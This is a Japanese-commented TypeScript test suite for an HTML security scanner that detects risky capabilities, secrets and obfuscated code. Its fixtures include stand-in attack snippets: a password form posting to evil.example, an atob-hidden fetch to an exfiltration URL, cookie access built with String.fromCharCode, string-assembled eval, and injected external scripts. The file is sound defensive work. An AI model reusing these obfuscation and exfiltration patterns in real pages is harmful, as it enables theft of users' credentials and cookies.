// scanHtml() の回帰テスト。
//
// Phase 2（#10）で AST 解析を入れた際に、
//   - 難読化・間接呼び出し・動的生成を検出できること
//   - コメントや文字列リテラル内のコード片を誤検知しないこと
//   - capabilities から自動で trust を付与しないこと（#12 の前提）
// が崩れないことを担保する。

import { describe, expect, it } from "vitest";
import { scanHtml } from "./index";
import { RUNTIME_MATRIX } from "./capability";

const wrap = (js: string) => `<!DOCTYPE html><html><body><script>${js}</script></body></html>`;
const ids = (html: string) => scanHtml(html).findings.map((f) => f.id);

describe("基本的な検出", () => {
  it("素のHTMLは risk: low で findings なし", () => {
    const report = scanHtml("<!DOCTYPE html><html><body><h1>hello</h1></body></html>");
    expect(report.risk).toBe("low");
    expect(report.findings).toHaveLength(0);
    expect(report.recommendation.trustRequired).toBe(false);
  });

  it("CDN読み込みだけなら HIGH は出ない", () => {
    const report = scanHtml(`<html><head>
      <script src="https://unpkg.com/react@18.3.1/umd/react.production.min.js"></script>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    </head><body></body></html>`);
    expect(report.summary.high).toBe(0);
    expect(report.externalDomains).toContain("unpkg.com");
  });

  it("同一オリジンAPIへのリクエストは HIGH", () => {
    const report = scanHtml(wrap(`fetch('/api/tools');`));
    expect(ids(wrap(`fetch('/api/tools');`))).toContain("same-origin-api-request");
    expect(report.risk).toBe("high");
  });

  it("親フレームへのアクセスと document.cookie は HIGH", () => {
    const found = ids(wrap(`frameElement.removeAttribute('sandbox'); const c = document.cookie;`));
    expect(found).toContain("frame-access");
    expect(found).toContain("cookie-access");
  });

  it("パスワード欄を持つ外部フォームは HIGH", () => {
    const report = scanHtml(
      `<form action="https://evil.example/collect" method="post"><input type="password" name="p"></form>`
    );
    const form = report.findings.find((f) => f.id === "external-form");
    expect(form?.severity).toBe("high");
  });
});

describe("Secret検出", () => {
  it("プロバイダ既知のキーは HIGH で検出し、値はマスクする", () => {
    const report = scanHtml(wrap(`const k = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";`));
    const secret = report.findings.find((f) => f.id === "hardcoded-secret");
    expect(secret?.severity).toBe("high");
    expect(secret?.evidence).not.toContain("AbCdEfGhIjKlMnOpQrStUvWxYz0123456789");
  });

  it("プレースホルダは検出しない", () => {
    expect(ids(wrap(`const k = "sk-example-xxxxxxxxxxxxxxxxxxxxxxxxxxxx";`))).not.toContain(
      "hardcoded-secret"
    );
  });

  it("Google APIキーは公開前提の可能性があるため MEDIUM", () => {
    const report = scanHtml(wrap(`const k = "AIzaSyD-1234567890abcdefghijklmnopqrstu";`));
    expect(report.findings.find((f) => f.id === "hardcoded-secret")?.severity).toBe("medium");
  });
});

describe("AST解析による検出（Phase 2 / #10）", () => {
  it("文字列連結で組み立てた eval を検出する", () => {
    expect(ids(wrap(`const f = window['ev'+'al']; f('alert(1)');`))).toContain("dynamic-code");
  });

  it("atob で隠した外部URLを検出する", () => {
    const report = scanHtml(wrap(`fetch(atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvY29sbGVjdA=='));`));
    expect(report.findings.map((f) => f.id)).toContain("external-request");
    expect(report.externalDomains).toContain("evil.example");
  });

  it("String.fromCharCode で構成した document.cookie を検出する", () => {
    const js = `const k = String.fromCharCode(99,111,111,107,105,101); const v = document[k];`;
    expect(ids(wrap(js))).toContain("cookie-access");
  });

  it("別名経由の localStorage を検出する", () => {
    expect(ids(wrap(`const s = window['local'+'Storage']; s.setItem('a','b');`))).toContain(
      "storage-usage"
    );
  });

  it("変数に退避した親フレームへのアクセスを検出する", () => {
    expect(ids(wrap(`const w = window; const p = w['par'+'ent']; const d = p.document;`))).toContain(
      "frame-access"
    );
  });

  it("実行時に生成した script 要素の外部読み込みを検出する", () => {
    const js = `const s = document.createElement('script'); s.src = 'https://cdn.evil.example/x.js'; document.head.appendChild(s);`;
    expect(ids(wrap(js))).toContain("external-script");
  });

  it("実行時に生成した外部送信フォームを検出する", () => {
    const js = `const f = document.createElement('form'); f.action='https://evil.example/p'; document.body.appendChild(f);`;
    expect(ids(wrap(js))).toContain("external-form");
  });

  it("innerHTML への iframe 挿入を検出する", () => {
    expect(ids(wrap(`document.body.innerHTML = '<ifr' + 'ame src="https://evil.example"></iframe>';`))).toContain(
      "embedded-frame"
    );
  });

  it("宛先が動的なリクエストは dynamic-network-target として報告する", () => {
    expect(ids(wrap(`fetch(location.hash.slice(1));`))).toContain("dynamic-network-target");
  });

  it("getUserMedia の制約から camera / microphone を切り分ける", () => {
    const report = scanHtml(wrap(`navigator.mediaDevices.getUserMedia({ video: true, audio: false });`));
    expect(report.capabilities.camera).toBe(true);
    expect(report.capabilities.microphone).toBe(false);
  });
});

describe("埋め込みHTMLの展開", () => {
  it("data: URI に埋め込んだHTMLの中身も解析する", () => {
    const inner = Buffer.from(`<script>fetch('https://evil.example')</script>`).toString("base64");
    const report = scanHtml(`<iframe src="data:text/html;base64,${inner}"></iframe>`);
    expect(report.externalDomains).toContain("evil.example");
  });

  it("srcdoc に埋め込んだスクリプトも解析する", () => {
    const html = `<iframe srcdoc="&lt;script&gt;localStorage.setItem('a','b')&lt;/script&gt;"></iframe>`;
    expect(ids(html)).toContain("storage-usage");
  });
});

describe("誤検知の抑制", () => {
  it("コメント内のコード片を検出しない", () => {
    const found = ids(wrap(`// fetch('https://not-called.example') は呼ばれない\nconsole.log('hi');`));
    expect(found).not.toContain("external-request");
  });

  it("文字列リテラル内のコード片を検出しない", () => {
    const js = `const doc = "使い方: fetch('https://example.com/api') のように書きます";`;
    expect(ids(wrap(js))).not.toContain("external-request");
  });

  it("el.parentNode を親フレームアクセスと誤検知しない", () => {
    const js = `const parent = document.body.parentNode; parent.appendChild(document.createElement('div'));`;
    expect(ids(wrap(js))).not.toContain("frame-access");
  });

  it("getUserMedia の audio: false をマイク利用と判定しない", () => {
    const report = scanHtml(wrap(`navigator.mediaDevices.getUserMedia({ video: true, audio: false });`));
    expect(report.capabilities.microphone).toBe(false);
  });
});

describe("trust 判定（#12 の前提）", () => {
  it("trustRequired は RUNTIME_MATRIX から導出される", () => {
    // storage は非trustでは使えないため trustRequired: true になる
    const report = scanHtml(wrap(`localStorage.setItem('a','b');`));
    expect(report.recommendation.trustRequired).toBe(true);
    expect(report.recommendation.reasons.join()).toContain(RUNTIME_MATRIX.storage.basis);
  });

  it("非trustで動く機能だけなら trustRequired: false", () => {
    const report = scanHtml(wrap(`fetch('https://api.example.com/x');`));
    expect(report.capabilities.network).toBe(true);
    expect(report.recommendation.trustRequired).toBe(false);
  });

  it("SecurityReport は trust を付与するフィールドを持たない", () => {
    const report = scanHtml(wrap(`localStorage.setItem('a','b'); navigator.mediaDevices.getUserMedia({video:true});`));
    // capabilities から自動で trust を立てないこと（判断はユーザーに残す）
    expect(Object.keys(report)).not.toContain("trust");
    expect(Object.keys(report.recommendation)).toEqual(["trustRequired", "reasons"]);
    expect(report.recommendation.reasons.length).toBeGreaterThan(0);
  });

  it("RUNTIME_MATRIX は Capabilities の全キーを網羅する", () => {
    const report = scanHtml("<html></html>");
    for (const key of Object.keys(report.capabilities)) {
      expect(RUNTIME_MATRIX).toHaveProperty(key);
    }
  });
});

describe("出力契約", () => {
  it("limitations と disclaimer を必ず含む", () => {
    const report = scanHtml("<html></html>");
    expect(report.limitations.length).toBeGreaterThan(0);
    expect(report.disclaimer).toContain("安全性の保証ではありません");
  });

  it("SecurityReport のキーは固定（MCP入出力の互換性）", () => {
    expect(Object.keys(scanHtml("<html></html>")).sort()).toEqual([
      "capabilities",
      "disclaimer",
      "externalDomains",
      "findings",
      "limitations",
      "recommendation",
      "risk",
      "summary",
    ]);
  });

  it("巨大なHTMLでも現実的な時間で完了する", () => {
    const big = "<div>text</div>\n".repeat(20000) + wrap("const a = 1;\n".repeat(5000));
    const start = performance.now();
    scanHtml(big);
    expect(performance.now() - start).toBeLessThan(3000);
  });
});
